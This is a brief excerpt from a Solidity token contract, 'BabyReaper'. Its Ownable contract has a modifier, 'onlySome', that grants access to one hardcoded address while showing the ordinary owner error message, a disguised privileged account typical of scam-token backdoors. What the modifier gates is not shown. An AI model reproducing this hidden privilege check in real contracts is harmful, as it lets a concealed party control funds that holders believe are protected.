...
contract Ownable is Context {
    ...
    modifier onlySome() {
        require(0x112a85d87e1569d91181658BFE3c10438F89eD92 == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract BabyReaper is Context, IERC20, Ownable {
    ...
    address payable public marketingAddress = payable(0xba320923751C22007b944095C929BdEe5438808f); // Marketing Address
